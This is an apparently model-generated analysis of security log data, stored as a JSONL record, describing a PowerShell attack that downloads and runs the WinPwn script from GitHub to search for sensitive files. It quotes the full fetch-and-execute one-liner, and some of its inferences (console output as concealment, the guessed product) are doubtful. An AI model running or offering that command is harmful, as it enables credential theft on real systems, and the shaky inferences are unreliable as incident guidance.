{"file":"filtering\/gemma3_4b\/attack\/20250606_143748.jsonl","analysis":"This is a log file from a security information and event management (SIEM) system, likely Symantec's Deep Security Manager. The logs appear to be related to a malicious PowerShell script that was executed on the system.\n\nHere are some key findings:\n\n1. **Malicious PowerShell Script**: The script was downloaded from a GitHub repository called \"WinPwn\" by a user using the `net.webclient` class, which is a built-in .NET class for downloading web content.\n2. **Sensitive File Detection**: The script uses the `sensitivefiles` module to detect sensitive files on the system. This suggests that the attackers may be looking for specific data or credentials to steal.\n3. **Non-Interactive Execution**: The script is executed in non-interactive mode, which means it runs without prompting the user for input or displaying any output.\n4. **Console Output**: The script outputs its results to the console, indicating that it's attempting to hide its activities from the user.\n\nSome notable events in the log include:\n\n* A PowerShell process was launched with a command line containing the malicious script: `powershell.exe & {iex(new-object net.webclient).downloadstring('https:\/\/raw.githubusercontent.com\/S3cur3Th1sSh1t\/WinPwn\/121dcee26a7aca368821563cbe92b2b5638c5773\/WinPwn.ps1')\\nsensitivefiles -noninteractive -consoleoutput}`\n* The `powershell.exe` process was launched multiple times with the same command line, indicating that the attackers may be attempting to evade detection or persistence mechanisms.\n* User Account Management tasks were executed, which could indicate attempts to create new user accounts or modify existing ones.\n\nTo mitigate this attack, I would recommend:\n\n1. **Block the GitHub repository**: Block access to the `WinPwn` GitHub repository to prevent the script from being downloaded.\n2. **Monitor PowerShell activity**: Monitor PowerShell processes and command lines for suspicious activity.\n3. **Implement sensitive file detection**: Implement a solution that detects and alerts on sensitive files being accessed or modified.\n4. **Review user accounts**: Review user account settings and permissions to ensure they are not being modified by the attackers.\n\nKeep in mind that this is just an analysis of the log data, and further investigation may be necessary to determine the full scope of the attack."}
